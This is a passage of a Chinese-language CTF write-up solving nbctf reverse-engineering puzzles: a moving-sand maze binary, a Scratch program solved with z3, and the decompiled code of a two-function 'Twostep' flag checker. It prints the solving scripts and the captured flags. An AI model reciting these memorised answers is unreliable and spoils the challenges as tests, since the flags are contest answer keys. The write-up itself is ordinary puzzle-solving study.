&#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( jj = <span class="number">9</span>; jj &gt;= <span class="number">0</span>; --jj )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">9</span>; ++kk )</span><br><span class="line">        &#123;</span><br><span class="line">          result = maze[<span class="number">10</span> * jj + kk];</span><br><span class="line">          <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (jj + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (jj + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = kk;</span><br><span class="line">                <span class="keyword">if</span> ( kk &gt;= <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = maze[<span class="number">10</span> * jj + <span class="number">10</span> + kk];</span><br><span class="line">                  <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    maze[<span class="number">10</span> * jj + kk] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                    result = &amp;maze[<span class="number">10</span> * jj + <span class="number">10</span> + kk];</span><br><span class="line">                    *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然是会动的迷宫 那盯着看原来的迷宫看是几乎不可能解出来的 这里提供一个python程序模仿迷宫的运作并记录步数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_maze</span>(<span class="params">maze, player_pos</span>):</span><br><span class="line">    <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(maze):</span><br><span class="line">        <span class="keyword">for</span> j, cell <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">            <span class="keyword">if</span> (i, j) == player_pos:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;$&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(cell, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move_player</span>(<span class="params">maze, direction, player_pos</span>):</span><br><span class="line">    row, col = player_pos</span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;w&#x27;</span> <span class="keyword">and</span> row &gt; <span class="number">0</span> <span class="keyword">and</span> maze[row - <span class="number">1</span>][col] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row - <span class="number">1</span>][col] = maze[row - <span class="number">1</span>][col], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row - <span class="number">1</span>, col)</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;s&#x27;</span> <span class="keyword">and</span> row &lt; <span class="built_in">len</span>(maze) - <span class="number">1</span> <span class="keyword">and</span> maze[row + <span class="number">1</span>][col] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row + <span class="number">1</span>][col] = maze[row + <span class="number">1</span>][col], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row + <span class="number">1</span>, col)</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> col &gt; <span class="number">0</span> <span class="keyword">and</span> maze[row][col - <span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row][col - <span class="number">1</span>] = maze[row][col - <span class="number">1</span>], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row, col - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;d&#x27;</span> <span class="keyword">and</span> col &lt; <span class="built_in">len</span>(maze[<span class="number">0</span>]) - <span class="number">1</span> <span class="keyword">and</span> maze[row][col + <span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row][col + <span class="number">1</span>] = maze[row][col + <span class="number">1</span>], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row, col + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> player_pos</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spread_sands</span>(<span class="params">maze, step</span>):</span><br><span class="line">    rows, cols = <span class="built_in">len</span>(maze), <span class="built_in">len</span>(maze[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> step % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> i &lt; rows - <span class="number">1</span> <span class="keyword">and</span> maze[i + <span class="number">1</span>][j] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i + <span class="number">1</span>][j] = maze[i + <span class="number">1</span>][j], maze[i][j]</span><br><span class="line">    <span class="keyword">elif</span> step % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> j &lt; cols - <span class="number">1</span> <span class="keyword">and</span> maze[i][j + <span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i][j + <span class="number">1</span>] = maze[i][j + <span class="number">1</span>], maze[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> step % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> maze[i - <span class="number">1</span>][j] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i - <span class="number">1</span>][j] = maze[i - <span class="number">1</span>][j], maze[i][j]</span><br><span class="line">    <span class="keyword">elif</span> step % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> j &gt; <span class="number">0</span> <span class="keyword">and</span> maze[i][j - <span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i][j - <span class="number">1</span>] = maze[i][j - <span class="number">1</span>], maze[i][j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maze_str = <span class="string">&quot;&quot;&quot;o###ooooo#</span></span><br><span class="line"><span class="string">                  oo#So##oo#</span></span><br><span class="line"><span class="string">                  #oS#o#SSo#</span></span><br><span class="line"><span class="string">                  #oo#o#oo##</span></span><br><span class="line"><span class="string">                  oSo#o#oSSo</span></span><br><span class="line"><span class="string">                  o###o#oSoo</span></span><br><span class="line"><span class="string">                  ooo#o#oooS</span></span><br><span class="line"><span class="string">                  ##o#o####o</span></span><br><span class="line"><span class="string">                  oSoSo#ooSo</span></span><br><span class="line"><span class="string">                  ooSoo#LSoo&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    maze = [<span class="built_in">list</span>(row.strip()) <span class="keyword">for</span> row <span class="keyword">in</span> maze_str.split(<span class="string">&#x27;\n&#x27;</span>)]</span><br><span class="line">    player_pos = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    step = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> maze[player_pos[<span class="number">0</span>]][player_pos[<span class="number">1</span>]] != <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">        print_maze(maze, player_pos)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Step: <span class="subst">&#123;step&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        direction = <span class="built_in">input</span>(<span class="string">&quot;Enter your move (w/a/s/d): &quot;</span>)</span><br><span class="line">        player_pos = move_player(maze, direction, player_pos)</span><br><span class="line">        spread_sands(maze, step)</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;WIN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是因为我的移动逻辑是交换 所以程序还是有点瑕疵(你不会赢 也不会似) 但是作为一个做出答案的辅助工具还是足够的</p>
<p>另外需要注意的是 附件中的迷宫运作逻辑是:</p>
<ol>
<li><code>S</code>移动</li>
<li>玩家所在行, 列变化</li>
<li>判断玩家所在行, 列是否是<code>S</code></li>
</ol>
<p>所以其实是可以实现类似居合和见切的效果的(玩太刀玩的) 不然也无法通关 e.g.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        →		→</span><br><span class="line">↓$    √	$o	√	So	√</span><br><span class="line">↑S       ↑S	   ↑$</span><br></pre></td></tr></table></figure>

<p>最后得到路线后nc到官方的端口并输入路线 得到flag:<code>nbctf&#123;5lowly_5huffl3d 5wa110wing_54nd5&#125;</code></p>
<h2 id="Itchy-Scratchy-Scratch编程逆向"><a href="#Itchy-Scratchy-Scratch编程逆向" class="headerlink" title="Itchy Scratchy | Scratch编程逆向"></a><strong>Itchy Scratchy</strong> | Scratch编程逆向</h2><p>没有混淆逻辑很清晰的Scratch工程文件:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-102029.png" alt="image-20231204194621457"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-102102.png" alt="image-20231204195439820"></p>
<p><code>alpha</code>和<code>enc</code>也都给出了 唯一的问题是最后需要解方程 这里用z3求解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">name = [<span class="number">29</span>,<span class="number">26</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">10</span>]</span><br><span class="line">alpha = <span class="string">&#x27;zvtwrca57n49u2by1jdqo6g0ksxfi8pelmh3&#x27;</span></span><br><span class="line">enc = [<span class="number">902</span>,<span class="number">764</span>,<span class="number">141</span>,<span class="number">454</span>,<span class="number">207</span>,<span class="number">51</span>,<span class="number">532</span>,<span class="number">1013</span>,<span class="number">496</span>,<span class="number">181</span>,<span class="number">562</span>,<span class="number">342</span>]</span><br><span class="line">j = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    j.append((i * i + name[i - <span class="number">1</span>]) % <span class="built_in">len</span>(name))</span><br><span class="line">factor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    factor.append(name[i] * name[j[i]])</span><br><span class="line">enc = [enc[i] - factor[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">vi = IntVector(<span class="string">&#x27;vi&#x27;</span>, <span class="number">12</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s.add(vi[i] * vi[j[i]] == enc[i])</span><br><span class="line">result = s.check()</span><br><span class="line"><span class="keyword">if</span> result == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    vi_values = [m[vi[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> vi_values:</span><br><span class="line">        <span class="built_in">print</span>(each, end=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No solution&#x27;</span>)</span><br><span class="line"><span class="comment"># [17, 14, 33, 32, 3, 3, 36, 5, 28, 17, 11, 12]</span></span><br><span class="line">intput = [<span class="number">17</span>, <span class="number">14</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">36</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">12</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nnbctf&#123;&quot;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> intput:</span><br><span class="line">    <span class="built_in">print</span>(alpha[each - <span class="number">1</span>], end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># nbctf&#123;12lett3rf149&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Twostep-构式加密"><a href="#Twostep-构式加密" class="headerlink" title="Twostep | 构式加密"></a><strong>Twostep</strong> | 构式加密</h2><p>题如其名 用了类似两步舞的加密方式 有一种独特的美感(但是逆向的时候感觉不出来😡)</p>
<p>用DIE打开附件 64位ELF无壳</p>
<p>主函数的逻辑依然很简单:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(input, a2, a3);</span><br><span class="line">  v3 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;C&#x27;mon y&#x27;all let&#x27;s boogie!\n&gt; &quot;</span>);</span><br><span class="line">  println(v3, &amp;<span class="built_in">std</span>::flush&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::length(input) == <span class="number">57</span> &amp;&amp; (v4 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(input), encrypto(v4)) )</span><br><span class="line">    v6 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Yeehaw!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v6 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Aww shucks!&quot;</span>);</span><br><span class="line">  println(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是打开<code>encrypto()</code>时出现了IDA无法反编译的错误 发现是text.40168C处发生了call无法解析的错误<del>我们去看看这个铸币是怎么回事</del></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040168B FF D0                         call    rax</span><br></pre></td></tr></table></figure>

<p>上下文也看不出rax存放的是固定的某个函数还是什么 不要紧我们先nop掉它 顺利反编译了<code>encrypto()</code> 发现它调用了<code>encrypto2()</code>(这些都是我自己命名的) 打开<code>encrypto2()</code>发现它调用了<code>encrypto()</code>… 这就是”两步舞”的含义 不管 先分析两个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypto</span><span class="params">(_BYTE *input_6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+19h] [rbp-A7h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+1Ah] [rbp-A6h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+1Ch] [rbp-A4h]</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+1Eh] [rbp-A2h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 k; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 m; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  __int16 v14[<span class="number">4</span>]; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  __int64 v15[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  __int64 v16[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+B6h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">18440</span>;</span><br><span class="line">  v14[<span class="number">1</span>] = <span class="number">3136</span>;</span><br><span class="line">  v14[<span class="number">2</span>] = <span class="number">18444</span>;</span><br><span class="line">  v14[<span class="number">3</span>] = <span class="number">16524</span>;</span><br><span class="line">  v16[<span class="number">0</span>] = <span class="number">1LL</span>;</span><br><span class="line">  v16[<span class="number">1</span>] = <span class="number">16LL</span>;</span><br><span class="line">  v16[<span class="number">2</span>] = <span class="number">32LL</span>;</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">512LL</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span class="number">1024LL</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">2048LL</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">0x2000</span>LL;</span><br><span class="line">  v16[<span class="number">7</span>] = <span class="number">0x4000</span>LL;</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">177LL</span>;</span><br><span class="line">  v15[<span class="number">1</span>] = <span class="number">166LL</span>;</span><br><span class="line">  v15[<span class="number">2</span>] = <span class="number">183LL</span>;</span><br><span class="line">  v15[<span class="number">3</span>] = <span class="number">182LL</span>;</span><br><span class="line">  v15[<span class="number">4</span>] = <span class="number">177LL</span>;</span><br><span class="line">  v15[<span class="number">5</span>] = <span class="number">173LL</span>;</span><br><span class="line">  v17 = <span class="number">170</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( var )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *input_6 == <span class="number">110</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">1</span>] == <span class="number">98</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">2</span>] == <span class="number">99</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">3</span>] == <span class="number">116</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">4</span>] == <span class="number">102</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">5</span>] == <span class="number">123</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = encrypto2(input_6 + <span class="number">6</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">      v11 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = v11[i];</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 |= (v2 &amp; <span class="number">3</span>) &lt;&lt; (<span class="number">4</span> * j + <span class="number">2</span>);</span><br><span class="line">          v2 &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != v14[i] )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto2(input_6);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">      v12 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0LL</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">        data[k] = v12[k];</span><br><span class="line">      result = encrypto2(input_6);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6LL</span>:</span><br><span class="line">      v3 = *check1_var_add(input_6);</span><br><span class="line">      v8 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v3 &amp; -v3;</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">8</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v16[v8] == v5 )</span><br><span class="line">          ++v8;</span><br><span class="line">        v3 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      result = v8 == <span class="number">8</span> &amp;&amp; encrypto2(input_6);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8LL</span>:</span><br><span class="line">      v13 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0LL</span>; m &lt;= <span class="number">5</span>; ++m )</span><br><span class="line">        LOBYTE(v17) = v13[m] ^ v15[m];</span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================================================</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">encrypto2</span><span class="params">(_BYTE *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 k; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10[<span class="number">6</span>]; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  __int64 v12[<span class="number">6</span>]; <span class="comment">// [rsp+90h] [rbp-70h]</span></span><br><span class="line">  __int64 v13[<span class="number">8</span>]; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">7</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0xD4F3</span>LL;</span><br><span class="line">  v13[<span class="number">1</span>] = <span class="number">0x3D49</span>LL;</span><br><span class="line">  v13[<span class="number">2</span>] = <span class="number">0x107B</span>LL;</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">0xC479</span>LL;</span><br><span class="line">  v13[<span class="number">4</span>] = <span class="number">0xAA84</span>LL;</span><br><span class="line">  v13[<span class="number">5</span>] = <span class="number">0x9807</span>LL;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">0x394C</span>LL;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">24063LL</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">37349LL</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">50716LL</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">61563LL</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">1843061LL</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">222420LL</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">5184810LL</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">4590105LL</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">2184197LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v12[<span class="number">0</span>] = <span class="number">1073741834LL</span>;</span><br><span class="line">  v12[<span class="number">1</span>] = <span class="number">2415919110LL</span>;</span><br><span class="line">  v12[<span class="number">2</span>] = <span class="number">939524099LL</span>;</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">536870913LL</span>;</span><br><span class="line">  v12[<span class="number">4</span>] = <span class="number">1845493760LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( var )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      v6 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">if</span> ( (*v6 ^ <span class="number">0x5F</span>) == v6[<span class="number">1</span>]</span><br><span class="line">        &amp;&amp; (v6[<span class="number">1</span>] ^ <span class="number">0x75</span>) == v6[<span class="number">2</span>]</span><br><span class="line">        &amp;&amp; (v6[<span class="number">2</span>] ^ <span 